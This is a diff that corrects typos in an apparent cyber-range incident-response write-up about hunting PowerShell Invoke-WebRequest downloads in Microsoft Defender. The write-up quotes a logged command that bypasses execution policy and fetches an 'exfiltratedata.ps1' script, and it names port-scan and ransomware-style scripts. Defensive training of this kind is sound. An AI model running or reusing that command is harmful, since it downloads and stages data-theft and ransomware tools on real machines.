@@ -10,11 +10,11 @@
 
 ##  Scenario
 
-Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machines displays incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 
+Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machines display incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 
 
 ### High-Level Incident Response Plan
 
-- **Check `DeviceProcessEvents`** for any PowerShell executions involving the `Invoke-WebRequest`command and investigate any suspicious download activity.
+- **Check `DeviceProcessEvents`** for any PowerShell executions involving the `Invoke-WebRequest` command and investigate any suspicious download activity.
 - **Check `DeviceProcessEvents`** for any successful execution of downloaded scripts to assess potential impact.
 - **If applicable, `isolate affected devices`, `block access to malicious domains`, `run an antimalware scan`, and `implement restrictions on PowerShell usage`** to prevent unauthorized script execution.
 
@@ -36,7 +36,7 @@ b)ProcessCommandLine
         powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
 
 
-The suspicious web request was triggered on 1 device: "windows-target-1 by 1 user, but downloaded 4 different scripts with 4 different commands
+The suspicious web request was triggered on 1 device: "windows-target-1" by 1 user, but downloaded 4 different scripts with 4 different commands
 
 
 <ul>
@@ -65,7 +65,7 @@ The suspicious web request was triggered on 1 device: "windows-target-1 by 1 use
 
 ### 2. Searched the `DeviceProcessEvents` Table a Second Time
 
-Searched for instances where the following scripts: `eicar.ps1`, `portscan.ps1`, `pwncrypt.ps1`, `exfiltratedata.ps1` were succesfullly executed. It was later discovered that all 4 scripts were indded.
+Searched for instances where the scripts: `eicar.ps1`, `portscan.ps1`, `pwncrypt.ps1`, `exfiltratedata.ps1` were successfully executed. It was later discovered that all 4 scripts were indeed.
 
 **Query used to locate events:**
 
@@ -101,7 +101,7 @@ Enhanced endpoint monitoring for script execution activities.
 
 ---
 
-### 5. Restored impacted virtual machine
+### 5. Restored the impacted virtual machine
 
 Reviewed and completed write-up for incident resolution. Finalized reporting and closed out the incident in Microsoft Sentinel as a true positive.
 
